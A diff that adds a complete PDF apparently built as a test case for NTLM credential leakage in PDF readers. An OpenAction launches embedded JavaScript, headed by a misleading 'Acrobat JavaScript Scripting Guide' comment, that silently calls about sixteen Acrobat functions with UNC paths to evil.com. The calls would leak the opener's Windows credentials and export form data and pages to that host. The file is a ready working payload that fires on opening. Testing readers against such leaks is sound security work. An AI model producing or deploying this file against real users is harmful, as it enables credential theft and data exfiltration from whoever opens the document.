@@ -1,0 +1,95 @@
+%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /OpenAction 5 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 70 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'javascript') Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /JavaScript
+     /JS 6 0 R
+  >>
+endobj
+
+6 0 obj
+  << /Length 2354 >>
+stream
+/* ----------------------------------------------------------------------------------------------------- */
+/* -----------------------------[ Acrobat JavaScript Scripting Guide ]---------------------------------- */
+/* ----------------------------------------------------------------------------------------------------- */
+try {this.submitForm({cURL: "\\\\evil.com\\ntlm-test-submitform.fdf"});}                        catch(e) {}
+try {this.getURL("\\\\evil.com\\ntlm-test-geturl.pdf");}                                        catch(e) {}
+try {app.launchURL("\\\\evil.com\\ntlm-test-launchurl.pdf");}                                   catch(e) {}
+try {app.media.getURLData("\\\\evil.com\\ntlm-test-geturldata.pdf", "audio/mp3");}              catch(e) {}
+try {SOAP.connect("\\\\evil.com\\ntlm-test-soap-connect.pdf");}                                 catch(e) {}
+try {SOAP.request({cURL:"\\\\evil.com\\ntlm-test-soap-request.pdf", oRequest:{}, cAction:""});} catch(e) {}
+try {app.openDoc("\\\\evil.com\\ntlm-test-opendoc.pdf");}                                       catch(e) {}
+/* ----------------------------------------------------------------------------------------------------- */
+try {this.importDataObject("file", "\\\\evil.com\\ntlm-test-dataobject.xml");}                  catch(e) {}
+try {this.importAnFDF("\\\\evil.com\\ntlm-test-import.fdf");}                                   catch(e) {}
+try {this.importAnXFDF("\\\\evil.com\\ntlm-test-import.xfdf"); }                                catch(e) {}
+/* ----------------------------------------------------------------------------------------------------- */
+try {this.exportAsFDF(false, true, "\\\\evil.com\\ntlm-test-export.fdf");}                      catch(e) {}
+try {this.exportAsXFDF(false, true, "\\\\evil.com\\ntlm-test-export.xfdf");}                    catch(e) {}
+try {this.exportAsText(true, "\\\\evil.com\\ntlm-test-export.txt");}                            catch(e) {}
+try {this.exportDataObject({cName: "\\\\evil.com\\ntlm-test-export.pdf"});}                     catch(e) {}
+try {this.exportXFAData({cPath: "\\\\evil.com\\ntlm-test-export.xdp"});}                        catch(e) {}
+try {this.extractPages({cPath: "\\\\evil.com\\ntlm-test-extract.pdf"});}                        catch(e) {}
+/* ----------------------------------------------------------------------------------------------------- */
+endstream
+endobj
+
+xref
+0 7
+0000000000 65535 f 
+0000000010 00000 n 
+0000000092 00000 n 
+0000000193 00000 n 
+0000000458 00000 n 
+0000000580 00000 n 
+0000000655 00000 n 
+trailer
+  << /Root 1 0 R
+     /Size 7
+  >>
+startxref
+3085
+%%EOF
